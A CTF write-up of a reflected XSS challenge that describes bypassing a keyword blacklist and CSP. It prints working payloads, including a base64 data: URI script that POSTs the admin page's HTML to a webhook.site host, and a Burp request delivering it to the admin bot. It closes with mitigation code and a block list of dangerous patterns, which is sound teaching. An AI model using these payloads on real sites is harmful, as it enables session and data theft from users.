# Pragyan CTF 2026

# Shadow Fight 2

## Web: XSS

## Description
Do you know more XSS?

## Files
> This challenge did not provide files, only the description.

---

## Analysis

We can see a website that serves as a kind of profile page using Lorem Picsum (a placeholder image service). When you upload your nickname and avatar, it displays the profile.

<img width="950" height="770" alt="web" src="https://github.com/user-attachments/assets/2ba40b48-ae4d-42d3-a6dc-45664e6c6f4e" />

We can see this gives us a URL, which converts it into a reflected XSS vulnerability. The level is quite similar to Shadow Fight 1 and gives us a similar URL:

```url
https://shadow-fight-2.ctf.prgy.in/?name=papitas&avatar=https%3A%2F%2Fpicsum.photos%2Fseed%2Fpicsum%2F200%2F300
```

Testing more thoroughly, the first thing I did was try my payload from Shadow Fight 1, but it didn't work. After testing various values and things, I came to the conclusion that there was a BLACKLIST of words and symbols like `document`, double quotes `"`, `fetch`, etc. I was testing payloads and found two that worked partially, but if you wanted to put more text in an alert, for example, it wouldn't let you. The solution was to bypass it like this:

```javascript
<video src=1 onerror=\a\l\ert\('hola\aa'\)>
```

<img width="978" height="543" alt="xss" src="https://github.com/user-attachments/assets/51dcd866-5bba-481b-bd19-983829766820" />

Even with this, there seemed to be a CSP (Content Security Policy) or WAF (Web Application Firewall) that didn't allow traffic to exit or use all JavaScript functions, including the bypass which also didn't fully allow JavaScript to pass through.

Another thing I noticed was the buffer size or input limit. In the first level, you could put your entire payload, even if large, in the name input. Here you couldn't do it directly, so using Python, I saw that the bottom part had no limitation while the top part was limited to 55 characters. I was able to verify this with Python and the requests library:

```python
print('Testing URL buffer')
for i in range(100, 200):
    miniurl = 'https://picsum.photos/seed/picsum/200/300' + 'A' * i
    URL = f'https://shadow-fight-2.ctf.prgy.in/?name=AAAA&avatar={miniurl}'
    response = requests.get(URL)
    if 'Invalid input' in response.text:
        print(f'Invalid buffer size: {i}')
    else:
        print(f'Valid buffer size: {i}')
```

What I could extract from this is that the top part, if you only put one character, said "invalid input" or the BLACKLIST activated, but if you put exactly 55 characters, nothing happened, and the bottom part didn't seem to have a limit.

Now this is somewhat obvious, but with this, I figured I could work on the URL part and force the XSS.

Knowing we need to work on the URL part, if we put another URL that isn't from picsum, it also sends an error. So the payload I used to bypass this was the following:

```html
</script><video src=1 onerror=alert(1)>
```

**URL:**
```url
https://shadow-fight-2.ctf.prgy.in/?name=papas&avatar=https%3A%2F%2Fpicsum.photos%2Fseed%2Fpicsum%2F200%2F300%3C%2Fscript%3E%3Cvideo+src%3D1+onerror%3Dalert%281%29%3E
```

<img width="965" height="275" alt="xss_url" src="https://github.com/user-attachments/assets/51083676-2ea8-4606-a937-3a7db8d20452" />

---

As we can see, for it to work, we need to close the `</script>` tag to open a new tag. Knowing this, we can begin with the solution.

## Theory

To solve this challenge, you need to understand:

- **XSS (Cross-Site Scripting)**: Understanding reflected XSS vulnerabilities and how user input is reflected in the HTML output without proper sanitization.
- **JavaScript**: Knowledge of JavaScript execution contexts, event handlers, and the DOM.
- **Blacklist Bypass**: Techniques to evade keyword filters using character escaping, encoding, or alternative syntax.
- **CSP (Content Security Policy) Bypass**: Understanding how CSP restricts script execution and finding ways to work within or around these restrictions.
- **SOP (Same-Origin Policy)**: Understanding browser security policies and how to work with them.
- **Data URIs**: Using data URIs to embed inline code and bypass external resource restrictions.
- **Base64 Encoding**: Using encoding to obfuscate payloads and bypass filters.
- **Patience**: The ability to systematically test and iterate on solutions :)

---

## Solution

### Step 1: Testing and Investigating the Vulnerability

Once the vulnerability was identified, I found that commands and payloads like fetch using character escaping (e.g., `\fe\t\ch`) failed. The page appeared to have both SOP (Same-Origin Policy) and CSP (Content Security Policy) protections. This left me to test the `src` attributes of scripts to see if I could bypass through there. I tested with my webhook, and bingo—we can see that it works and I receive the request on my webhook server.

<img width="584" height="51" alt="webhook_url" src="https://github.com/user-attachments/assets/5a42386a-bc72-4b42-b080-a17f0b3b184a" />

```html
</script><script src='https://webhook.site/6c7adab5-a6ec-403f-9e23-52a8b20dedc2'></script>
```

<img width="877" height="479" alt="src_script" src="https://github.com/user-attachments/assets/381c1590-dcd6-42bf-bfdd-b6eb38e7c7d2" />

### Step 2: Exploiting the Vulnerability

Once I knew this, I could use a payload that essentially calls JavaScript but in the `src` attribute. Let me explain: instead of telling the script that it's somewhere external on the internet, I tell it that it's right here—a kind of self-reference. This allows me to put the script right there inline, and it also helps bypass the blacklist because we can encode it in URL encoding or better yet in Base64, allowing us to bypass the blacklist. At the moment of telling the `src` that we ourselves are the script, we bypass the CSP and likely the SOP as well.

First, I crafted the JavaScript code to obtain the HTML, then passed it through CyberChef or directly in the browser to convert it to Base64:

```javascript
// 1) Build the JavaScript payload
fetch('https://webhook.site/591fbec1-df10-4f58-9237-af296754c99c', {
    method:'POST', 
    body:document.documentElement.innerHTML
})

// 2) Convert to Base64
ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzU5MWZiZWMxLWRmMTAtNGY1OC05MjM3LWFmMjk2NzU0Yzk5YycsIHttZXRob2Q6J1BPU1QnLCBib2R5OmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUx9KQ==

// 3) Build the payload with tags
</script><script src='data:text/javascript;base64,ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzU5MWZiZWMxLWRmMTAtNGY1OC05MjM3LWFmMjk2NzU0Yzk5YycsIHttZXRob2Q6J1BPU1QnLCBib2R5OmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUx9KQ=='></script>
```

As I mentioned before, the `src` uses `data:text/javascript` to tell it that the script is right there in the src and not to look for it elsewhere, but to execute it from there. The final payload looks like this:

```html
https://picsum.photos/seed/picsum/200/300</script><script src='data:text/javascript;base64,ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzU5MWZiZWMxLWRmMTAtNGY1OC05MjM3LWFmMjk2NzU0Yzk5YycsIHttZXRob2Q6J1BPU1QnLCBib2R5OmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUx9KQ=='></script>
```

**URL Encoded version:**
```
%68%74%74%70%73%3a%2f%2f%70%69%63%73%75%6d%2e%70%68%6f%74%6f%73%2f%73%65%65%64%2f%70%69%63%73%75%6d%2f%32%30%30%2f%33%30%30%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%73%72%63%3d%27%64%61%74%61%3a%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%3b%62%61%73%65%36%34%2c%5a%6d%56%30%59%32%67%6f%4a%32%68%30%64%48%42%7a%4f%69%38%76%64%32%56%69%61%47%39%76%61%79%35%7a%61%58%52%6c%4c%7a%55%35%4d%57%5a%69%5a%57%4d%78%4c%57%52%6d%4d%54%41%74%4e%47%59%31%4f%43%30%35%4d%6a%4d%33%4c%57%46%6d%4d%6a%6b%32%4e%7a%55%30%59%7a%6b%35%59%79%63%73%49%48%74%74%5a%58%52%6f%62%32%51%36%4a%31%42%50%55%31%51%6e%4c%43%42%69%62%32%52%35%4f%6d%52%76%59%33%56%74%5a%57%35%30%4c%6d%52%76%59%33%56%74%5a%57%35%30%52%57%78%6c%62%57%56%75%64%43%35%70%62%6d%35%6c%63%6b%68%55%54%55%78%39%4b%51%3d%3d%27%3e%3c%2f%73%63%72%69%70%74%3e
```

### Step 3: Submitting to Admin via Burp Suite

Finally, we need to URL encode the entire payload and intercept the request with Burp Suite to send it to the admin for review so our payload can be executed.

**Burp Suite Request:**
```http
POST /review?name=papitas&avatar=%68%74%74%70%73%3a%2f%2f%70%69%63%73%75%6d%2e%70%68%6f%74%6f%73%2f%73%65%65%64%2f%70%69%63%73%75%6d%2f%32%30%30%2f%33%30%30%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%73%72%63%3d%27%64%61%74%61%3a%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%3b%62%61%73%65%36%34%2c%5a%6d%56%30%59%32%67%6f%4a%32%68%30%64%48%42%7a%4f%69%38%76%64%32%56%69%61%47%39%76%61%79%35%7a%61%58%52%6c%4c%7a%55%35%4d%57%5a%69%5a%57%4d%78%4c%57%52%6d%4d%54%41%74%4e%47%59%31%4f%43%30%35%4d%6a%4d%33%4c%57%46%6d%4d%6a%6b%32%4e%7a%55%30%59%7a%6b%35%59%79%63%73%49%48%74%74%5a%58%52%6f%62%32%51%36%4a%31%42%50%55%31%51%6e%4c%43%42%69%62%32%52%35%4f%6d%52%76%59%33%56%74%5a%57%35%30%4c%6d%52%76%59%33%56%74%5a%57%35%30%52%57%78%6c%62%57%56%75%64%43%35%70%62%6d%35%6c%63%6b%68%55%54%55%78%39%4b%51%3d%3d%27%3e%3c%2f%73%63%72%69%70%74%3e HTTP/2
Host: shadow-fight-2.ctf.prgy.in
Content-Length: 0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://shadow-fight-2.ctf.prgy.in
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

We receive a response confirming that the admin will review it soon:

<img width="2028" height="1122" alt="burp" src="https://github.com/user-attachments/assets/933f3447-5c34-4265-a85b-7c754822884b" />

And that's it! We receive the admin's HTML code and see that it makes requests to our webhook:

<img width="1119" height="390" alt="webhook" src="https://github.com/user-attachments/assets/3e9cf671-b6e3-4c05-93b4-0da63e83f17e" />

In the POST request, we can see the following code:

<img width="1210" height="405" alt="flag" src="https://github.com/user-attachments/assets/fd8ab7d1-5bdc-42c9-a46c-09d857409570" />

```html
<script>
  (function() {
    const container = document.createElement('div');
    container.id = 'secret';
    const shadow = container.attachShadow({ mode: 'closed' });
    shadow.innerHTML = '<p style="opacity: 0;">p_ctf{admz_nekki_kekw_c6e194c17f2405c5}</div>';
    document.querySelector('.card').appendChild(container);
  })();
</script>
```

**MACHINE PWNED!** :)

---

## Flag
> **p_ctf{admz_nekki_kekw_c6e194c17f2405c5}**

---

## How to avoid

To prevent XSS attacks like this one, implement the following comprehensive security measures:

### 1. **Input Validation and Sanitization**

Never trust user input. Implement strict validation on both client and server sides:

- **Use allowlists instead of blacklists**: Blacklists can always be bypassed. Define what IS allowed rather than what ISN'T.
- **Validate URL schemes**: Only allow `http://` and `https://` protocols, reject `data:`, `javascript:`, `vbscript:`, etc.
- **Validate domains**: If accepting URLs, use a strict allowlist of permitted domains.
- **Limit input length**: Enforce reasonable character limits on all input fields.

```python
from urllib.parse import urlparse
import re

ALLOWED_DOMAINS = ['picsum.photos']
ALLOWED_SCHEMES = ['https']

def validate_avatar_url(url):
    try:
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False
            
        # Check domain
        if parsed.netloc not in ALLOWED_DOMAINS:
            return False
            
        # Ensure no path traversal or injection attempts
        if any(char in url for char in ['<', '>', '"', "'", 'javascript:', 'data:']):
            return False
            
        return True
    except:
        return False

def validate_name(name):
    # Only allow alphanumeric characters and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s\-_]{1,50}$', name):
        return False
    return True
```

### 2. **Content Security Policy (CSP)**

Implement a strict CSP header to prevent execution of inline scripts and restrict resource loading:

```python
# Flask example
from flask import Flask, make_response

@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "  # No inline scripts, no data: URIs
        "img-src 'self' https://picsum.photos; "
        "style-src 'self' 'unsafe-inline'; "  # Be cautious with this
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'"
    )
    return response
```

**Key CSP directives to prevent this attack:**
- Avoid `'unsafe-inline'` for `script-src`
- Block `data:` URIs in `script-src`
- Use nonces or hashes for inline scripts when absolutely necessary

### 3. **Output Encoding**

Always encode output based on the context where it will be used:

```python
import html
from urllib.parse import quote

def render_profile(name, avatar_url):
    # HTML context encoding
    safe_name = html.escape(name)
    
    # URL context encoding (for href, src attributes)
    safe_avatar = quote(avatar_url, safe=':/')
    
    # Additional validation
    if not validate_avatar_url(avatar_url):
        safe_avatar = '/default-avatar.png'
    
    if not validate_name(name):
        safe_name = 'Anonymous'
    
    return f'''
    <div class="profile">
        <h2>{safe_name}</h2>
        <img src="{safe_avatar}" alt="Profile picture" />
    </div>
    '''
```

### 4. **Use Security Libraries and Frameworks**

Leverage well-tested libraries designed to prevent XSS:

```python
from bleach import clean
from markupsafe import Markup

# For rich text, use bleach to sanitize HTML
ALLOWED_TAGS = ['b', 'i', 'u', 'strong', 'em']
ALLOWED_ATTRIBUTES = {}

def sanitize_html(user_input):
    return clean(user_input, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES, strip=True)

# For templates, use auto-escaping frameworks like Jinja2
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape(['html', 'xml']))
```

### 5. **HTTP Security Headers**

Implement multiple security headers:

```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response
```

### 6. **Specific Protection Against This Attack**

To specifically prevent the attack shown in this writeup:

```python
def validate_avatar_url_strict(url):
    """
    Strict validation to prevent script injection via URL parameter
    """
    # Decode URL to catch encoded attacks
    from urllib.parse import unquote
    decoded = unquote(url)
    
    # Check for script tags, event handlers, and data URIs
    dangerous_patterns = [
        '<script', '</script>', 'javascript:', 'data:',
        'onerror=', 'onload=', 'onclick=', 'onmouseover=',
        '<iframe', '<object', '<embed', '<video', '<audio'
    ]
    
    decoded_lower = decoded.lower()
    for pattern in dangerous_patterns:
        if pattern in decoded_lower:
            return False
    
    # Validate it's a proper picsum URL
    if not decoded.startswith('https://picsum.photos/'):
        return False
        
    return True
```

### 7. **Server-Side URL Fetching**

Instead of allowing arbitrary URLs, fetch and validate images server-side:

```python
import requests
from PIL import Image
from io import BytesIO

def fetch_and_validate_image(url):
    """
    Fetch image server-side, validate it's actually an image,
    and serve it from your own domain
    """
    if not validate_avatar_url_strict(url):
        return None
    
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        
        # Verify it's actually an image
        img = Image.open(BytesIO(response.content))
        img.verify()
        
        # Save to your server and return local path
        filename = f"avatars/{uuid.uuid4()}.png"
        img.save(filename)
        return filename
        
    except Exception as e:
        return None
```

### Example Secure Implementation:

```python
from flask import Flask, request, render_template_string, abort
import html
import re
from urllib.parse import urlparse, unquote

app = Flask(__name__)

ALLOWED_DOMAINS = ['picsum.photos']
DANGEROUS_PATTERNS = [
    '<script', '</script>', 'javascript:', 'data:', 'onerror=',
    'onload=', '<iframe', '<object', '<embed', '<video'
]

def is_safe_input(text, max_length=50):
    """Validate text input"""
    if not text or len(text) > max_length:
        return False
    # Only allow alphanumeric and basic punctuation
    return bool(re.match(r'^[a-zA-Z0-9\s\-_.]+$', text))

def is_safe_url(url):
    """Strictly validate URL"""
    try:
        decoded = unquote(url).lower()
        
        # Check for dangerous patterns
        if any(pattern in decoded for pattern in DANGEROUS_PATTERNS):
            return False
        
        parsed = urlparse(url)
        
        # Only HTTPS and specific domain
        if parsed.scheme != 'https':
            return False
        
        if parsed.netloc not in ALLOWED_DOMAINS:
            return False
            
        return True
    except:
        return False

@app.route('/')
def profile():
    name = request.args.get('name', '')
    avatar = request.args.get('avatar', '')
    
    # Validate inputs
    if not is_safe_input(name):
        abort(400, "Invalid name")
    
    if not is_safe_url(avatar):
        abort(400, "Invalid avatar URL")
    
    # Escape for HTML context
    safe_name = html.escape(name)
    safe_avatar = html.escape(avatar)
    
    # Use template with auto-escaping
    template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="Content-Security-Policy" 
              content="default-src 'self'; script-src 'self'; img-src 'self' https://picsum.photos;">
    </head>
    <body>
        <div class="profile">
            <h2>{{ name }}</h2>
            <img src="{{ avatar }}" alt="Profile picture">
        </div>
    </body>
    </html>
    '''
    
    return render_template_string(template, name=safe_name, avatar=safe_avatar)

if __name__ == '__main__':
    app.run()
```

### References:

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN Web Docs - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [PortSwigger - Cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

---

> **Author:** Jose Antonio Villafaña Montes de Oca
